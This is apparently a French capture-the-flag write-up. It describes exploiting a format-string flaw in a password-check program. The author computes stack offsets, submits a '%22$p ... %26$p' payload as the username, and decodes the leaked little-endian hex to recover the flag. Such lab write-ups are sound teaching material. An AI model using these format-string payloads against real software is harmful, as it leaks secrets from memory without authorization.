Ici des le premier coup d'oeil au code on voit qu'on a à faire à une format string

printf(s) quand on se trompe de password donc on va tout de suite l'exploiter pour passer le strncmp

En bidouillant un peu on voit que mon input si je fais 

AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 

est a la 28eme position hors ptr qui est la variable que nous voulons lire se trouve à rbp-0xa0 et mon input se trouve à 
rbp - 0x70 si on fait la soustraction on obtient 48 bits donc on est à 48 d'écart étant donné qu'une adresse c 8 on va allé à 28 (la position de l'input) - (48 / 8 (taille d'une addr)) = 22 donc la variable qu'on cherche doit se trouver à la 22eme position de la format string

Notre flag fait 40 char donc il nous fait afficher 40 / 8 = 5 fois 8 bytes

donc 22 23 24 25 26

--[ Username: %22$p %23$p %24$p %25$p %26$p
--[ Password: dfa
*****************************************
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!


Ensuite on convertit l'hexa inversé (little endian) en string et on obtient le flag